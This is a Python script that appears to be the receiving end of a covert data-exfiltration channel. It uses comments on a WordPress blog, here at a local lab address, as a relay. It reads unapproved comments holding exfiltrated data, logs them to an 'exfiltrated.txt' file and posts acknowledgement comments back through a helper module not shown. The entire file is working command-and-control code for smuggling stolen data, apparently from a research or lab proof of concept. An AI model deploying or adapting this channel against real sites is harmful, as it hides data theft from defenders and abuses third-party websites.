#!/usr/bin/env python3
from wpc2 import *
import sys
import datetime

random.seed(int(datetime.datetime.now().timestamp()) + int(sys.argv[1]))

channel = Channel()
channel.target_blog = "http://127.0.0.3/"
channel.exfil_channel = "2021/08/13/exfil-channel/"
channel.exfil_channel_id = 5
channel.ack_channel = "2021/08/13/ack-channel/"
channel.ack_channel_id = 7

recv_time_slot = 10
process_time_slot = 20

prev_unapproved_index = 0

class Client:
    id = ""
    time_slot = ""

clients = []
for i in range(1, 4):
    client = Client()
    client.id = str(i)
    clients.append(client)
    print("## Created client with id: " + str(client.id))

if prev_unapproved_index == 0:
    prev_unapproved_index = get_current_unapproved_index(channel)
    
loop_counter = 99
while(loop_counter > 0):
    received_data = receive_data(channel, len(clients), recv_time_slot, process_time_slot, prev_unapproved_index)
    prev_unapproved_index = get_current_unapproved_index(channel)

    for exfil_content in received_data:
        to_write = str(datetime.datetime.utcnow()) + ": "
        to_write += "Extracted data with timeslot of " + str(recv_time_slot) + ": " + exfil_content + "\n"
        print("[INFO] " + to_write);
        f = open("../output/exfiltrated.txt", "a")
        f.write(to_write)
        f.close()
        
        message_id = exfil_content.split(":")[0]
        print("[INFO] Extracted message_id is " + message_id)
        submit_comment(channel.target_blog, channel.ack_channel_id, message_id)

    loop_counter -= 1
